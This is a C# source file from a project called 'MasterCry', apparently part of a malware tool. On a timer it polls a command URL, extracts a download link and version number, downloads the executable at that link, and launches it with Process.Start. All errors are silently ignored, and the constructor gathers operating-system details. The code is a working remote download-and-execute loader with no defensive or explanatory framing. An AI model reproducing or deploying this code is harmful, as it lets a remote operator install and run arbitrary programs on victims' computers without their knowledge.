
/****************************** ghost1372.github.io ******************************\
*	Module Name:	Form1.cs
*	Project:		MasterCry
*	Copyright (C) 2017 Mahdi Hosseini, All rights reserved.
*	This software may be modified and distributed under the terms of the MIT license.  See LICENSE file for details.
*
*	Written by Mahdi Hosseini <Mahdidvb72@gmail.com>,  2017, 9, 18, 08:45 ب.ظ
*	
***********************************************************************************/

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace MasterCry
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            if(!System.IO.File.Exists(BuildVars.Save_Location))
                System_Details.getOperatingSystemInfo();
        }

        //Todo: Test Downloder
        private void Downloader()
        {
            var result = (new WebClient()).DownloadString(BuildVars.Command_URL);

            int pFromURL = result.IndexOf("###") + "###".Length;
            int pToURL = result.LastIndexOf("###");

            int pFromVER = result.IndexOf("$$$") + "$$$".Length;
            int pToVER = result.LastIndexOf("$$$");

            String link = result.Substring(pFromURL, pToURL - pFromURL);
            String ver = result.Substring(pFromVER, pToVER - pFromVER);

            var preVer = System_Details.ReadSetting(BuildVars.Config_Command_Version);

            if (preVer.Equals("0") || ver != preVer && !link.Equals("null"))
            {
                   try
                    {
                    System_Details.AddUpdateAppSettings(BuildVars.Config_Command_Version, ver);
                        using (WebClient wc = new WebClient())
                        {
                            wc.DownloadFileCompleted += WebClientDownloadCompleted;
                            wc.DownloadFileAsync(new System.Uri(link),
                            BuildVars.Exe_Name);
                        }
                    }
                    catch (WebException) { }
                    catch (Exception) { }
            }
        }
        private void WebClientDownloadCompleted(object sender, AsyncCompletedEventArgs args)
        {
            System.Diagnostics.Process.Start(BuildVars.Exe_Name);
        }

        private void tmrURLCheck_Tick(object sender, EventArgs e)
        {
            Downloader();
        }
    }
}
